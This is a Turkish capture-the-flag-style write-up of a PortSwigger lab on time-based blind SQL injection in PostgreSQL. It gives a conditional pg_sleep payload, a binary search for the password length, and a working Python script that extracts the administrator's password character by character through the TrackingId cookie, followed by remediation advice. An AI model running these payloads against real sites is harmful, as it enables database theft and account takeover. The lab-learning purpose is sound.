# SQLi Lab #11: Blind SQLi — time delays + information retrieval (PostgreSQL) — 01.11.2026

> Blind serisinin finali. Zaman sinyalini bir koşula bağlayıp (CASE WHEN ... pg_sleep) gerçek şifreyi çıkardık. Conditional errors'daki CASE mantığının birebir aynısı — sadece 1/0 yerine pg_sleep.

**Lab:** PortSwigger → SQL injection → Blind → *time delays and information retrieval* (Practitioner, PostgreSQL)
**Görev:** Zaman sinyaliyle administrator'ın şifresini çıkar, giriş yap.

## Oracle'ı kurma — koşullu gecikme
Önceki time-delays'te gecikme koşulsuzdu; burada koşula bağladık:
```
' || CASE WHEN (KOŞUL) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
- KOŞUL **doğru** → 10 sn gecikme (evet); **yanlış** → anında (hayır).
- Kanıt: `1=1` → ~10 sn; `1=2` → hızlı. Zaman-oracle hazır.
(Bu, conditional errors'daki `CASE WHEN ... THEN 1/0` yapısının aynısı; sinyal 500 yerine süre.)

## Veri çıkarma (tanıdık omurga)
- **Uzunluk:** `KOŞUL = (SELECT LENGTH(password) FROM users WHERE username='administrator')>N`, gecikme var/yok ile binary search → `>19` gecikmeli, `>20` hızlı → **20 karakter** (off-by-one dikkat).
- **Karakterler:** `KOŞUL = (SELECT SUBSTRING(password,POZ,1) FROM users WHERE username='administrator')='X'`.
  - Precision: PostgreSQL → **`SUBSTRING`** (Oracle'daki `SUBSTR` değil).

## Otomasyon (Python) — sinyal artık süre
Conditional errors script'inden iki değişiklik + bir hız ayarı:
```python
import requests, time
url  = "https://LAB-ID.web-security-academy.net/"
base = "GEÇERLI_TRACKINGID"
charset = "0123456789abcdefghijklmnopqrstuvwxyz"
password = ""
for pozisyon in range(1, 21):
    for karakter in charset:
        payload = base + f"' || CASE WHEN ((SELECT SUBSTRING(password,{pozisyon},1) FROM users WHERE username='administrator')='{karakter}') THEN pg_sleep(3) ELSE pg_sleep(0) END--"
        response = requests.get(url, cookies={"TrackingId": payload})
        if response.elapsed.total_seconds() > 2.5:     # sinyal = SÜRE
            password += karakter
            print(f"{pozisyon}. karakter: {karakter}  ->  {password}")
            break
    time.sleep(0.1)
print(f"\nSifre: {password}")
```
- Sinyal: `response.elapsed.total_seconds() > 2.5` (içerik/kod değil, süre).
- Hız: `pg_sleep(10)` yerine `pg_sleep(3)` — time-based en yavaş yöntem, kısa gecikme yeter.
Çıkan şifreyle `administrator` login → **Solved.** ✅

## Blind'ın tamamı — tek kalıp
> **Omurga (hep aynı):** evet/hayır oracle → `LENGTH` (uzunluk) → `SUBSTRING` (karakter karakter).
> **Değişen (tek şey):** sinyal.
> - responses → içerik (Welcome back)
> - errors → HTTP kodu (500/200)
> - time → süre (gecikme)

Üç lab, üç sinyal, tek iskelet. Kutu hep cevap verir; değişen, "evet"i nasıl söylediği.

## 🛡️ Nasıl kapatılır (remediation)
- **Parameterized queries** — tek gerçek çözüm; girdi SQL yapısına karışamazsa koşullu gecikme de enjekte edilemez.
- Time-based, çıktı/hata tamamen gizliyken bile çalışır → "gizlersem güvenli olurum" yanılgısını kesin çürütür.
- Least privilege; anormal gecikme/sorgu süresi monitoringi (tespit, önlem değil); hassas veriyi hash'le.

## Zincir bağı
- Blind serisi tamam: responses → errors → time-delays → time + info-retrieval.
- Her biri aynı omurganın farklı sinyali; otomasyon (Python) hepsinde aynı iskelet, sadece "sinyal kontrolü" satırı değişiyor.
- Sıradaki: SQLi'de filtre/WAF atlatma ve/veya yeni bir zafiyet sınıfı.
